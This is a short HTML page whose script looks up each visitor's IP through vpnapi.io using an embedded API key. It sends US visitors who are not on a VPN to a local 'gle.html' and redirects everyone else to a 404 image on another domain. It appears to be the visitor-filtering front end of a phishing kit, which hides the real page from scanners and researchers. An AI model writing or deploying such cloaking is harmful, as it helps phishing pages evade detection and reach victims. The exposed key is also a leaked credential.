<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

</head>
<body>

	<script type="text/javascript">
		const api_url = "https://vpnapi.io/api/?key=ae57408749c84e78b9026f0a210b418a"
		async function getISS(){
			const response = await fetch(api_url);
			const data = await response.json();
			var vpn = data.security.vpn;
			var loc = data.location.country_code;

			console.log(vpn)
			console.log(loc)
		if (vpn.toString() == "false" && loc == "US") {
			window.location.replace("gle.html");
		} 
			else {
				window.location.replace("https://lapraim.com/assets/images/insights/404-error/404-error.jpg");
			}
		}

		getISS();
	</script>

</body>
